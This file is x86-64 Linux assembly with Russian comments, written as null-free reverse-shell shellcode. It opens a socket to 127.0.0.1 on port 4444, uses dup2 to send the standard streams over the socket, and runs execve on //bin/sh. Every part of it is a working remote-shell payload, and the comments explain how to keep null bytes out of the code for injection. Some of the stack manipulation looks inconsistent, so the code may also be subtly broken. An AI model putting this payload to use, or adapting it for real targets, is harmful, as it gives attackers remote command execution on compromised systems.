global _start

section .text

_start:
    ; --- 1. Создаем сокет ---
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    ; socket(2, 1, 0)
    
    xor rax, rax
    add rax, 41         ; syscall 41 = socket
    
    xor rdi, rdi
    add rdi, 2          ; AF_INET = 2
    
    xor rsi, rsi
    inc rsi             ; SOCK_STREAM = 1
    
    xor rdx, rdx        ; Protocol = 0
    
    syscall
    
    ; Сохраняем дескриптор сокета (он вернулся в RAX) в RDI для следующего шага
    mov rdi, rax        

    ; --- 2. Подключаемся (Connect) ---
    ; connect(sockfd, struct sockaddr *addr, int addrlen)
    ; Структура sockaddr_in:
    ; family (2 bytes), port (2 bytes), address (4 bytes), zero (8 bytes)
    
    ; Очищаем регистр для работы со стеком
    xor rax, rax 
    push rax            ; Кладем 8 байт нулей (для padding и части IP)

    ; Строим IP 127.0.0.1 (0x7F000001) без null-байтов в коде
    ; Стек уже занулен. Нам нужно: 
    ; [ AF=2 ] [ Port ] [ 127 ] [ 0 ] [ 0 ] [ 1 ] ...
    
    ; Устанавливаем IP: 127.0.0.1
    ; Мы знаем, что там нули. Меняем только нужные байты.
    mov byte [rsp+4], 0x7f  ; 127
    mov byte [rsp+7], 0x01  ; 1
    ; В памяти сейчас: xx xx xx xx 7F 00 00 01 (Little Endian нюансы, но для сети важно расположение)
    ; Правильная структура sockaddr_in в памяти (16 байт):
    ; [Family-2b] [Port-2b] [IP-4b] [Zero-8b]
    
    ; Сделаем аккуратно через стек, чтобы наверняка:
    ; IP 127.0.0.1 = 0x0100007f (network byte order не важен для 127/8, но порядок байт важен)
    ; Чтобы не было нулей в коде, сформируем структуру в регистре или по частям.
    
    ; Переделаем заполнение стека для надежности (Port 4444 = 0x115c -> swap -> 0x5c11)
    
    mov dword [rsp], 0x0100007f  ; 127.0.0.1 (ВНИМАНИЕ: тут будет NULL байт в опкоде!)
    ; ^^^ Это плохой способ для шелл-кода.
    
    ; --- ХИТРЫЙ СПОСОБ ЗАПОЛНЕНИЯ (NO-NULL) ---
    xor r10, r10
    push r10        ; Стек чист
    
    ; IP: 127.0.0.1 (0x7f000001) в обратном порядке для стека? 
    ; sockaddr_in struct:
    ; WORD sin_family
    ; WORD sin_port
    ; DWORD sin_addr
    ; QWORD sin_zero
    
    ; Формируем DWORD IP: 0x0100007f. 
    ; Создаем его через вычисления, чтобы в коде не было 00
    mov r10d, 0xFEFFFF80 ; Взяли число (отрицательное)
    xor r10d, 0xFFFFFFFF ; Инвертируем биты -> получаем 0x0100007F
    
    ; Порт 4444 (0x115c) -> Big Endian = 0x5c11
    ; AF_INET = 0x0002
    
    ; Собираем всё в регистр RBX, потом пушим
    ; Нам нужно: 0x 0100007f 5c11 0002
    ; Но это сложно. Проще пушить кусками.
    
    push r10             ; Запушили IP (и мусор в старших байтах, но IP это 4 байта)
                         ; Сейчас rsp указывает на IP.
    
    mov word [rsp-2], 0x5c11 ; Порт 4444
    mov word [rsp-4], 0x0002 ; AF_INET
    sub rsp, 4               ; Сдвигаем стек на начало структуры
    
    ; Теперь RSP указывает на структуру sockaddr
    
    ; syscall connect (42)
    xor rax, rax
    mov al, 42          ; connect
    mov rsi, rsp        ; указатель на структуру
    mov rdx, 16         ; длина структуры (16 байт)
    syscall
    
    ; --- 3. Перенаправление ввода-вывода (Dup2) ---
    ; dup2(sockfd, newfd)
    ; Нам нужно сделать dup2 для 0 (stdin), 1 (stdout), 2 (stderr)
    ; Используем цикл.
    
    xor rsi, rsi
    mov si, 2           ; начинаем с 2 (stderr)
    
dup_loop:
    xor rax, rax
    mov al, 33          ; syscall 33 = dup2
    syscall             ; rdi уже содержит sockfd (мы его не трогали), rsi меняется
    
    dec rsi             ; уменьшаем счетчик
    jns dup_loop        ; прыгаем, пока флаг Sign не установлен (пока >= 0)
    
    ; --- 4. Запуск оболочки /bin/sh ---
    ; execve("//bin/sh", NULL, NULL)
    
    xor rax, rax
    push rax            ; NULL терминатор
    
    mov rbx, 0x68732f6e69622f2f ; "//bin/sh"
    push rbx
    
    mov rdi, rsp        ; указатель на строку
    
    xor rsi, rsi        ; argv = NULL
    xor rdx, rdx        ; envp = NULL
    
    mov al, 59          ; execve
    syscall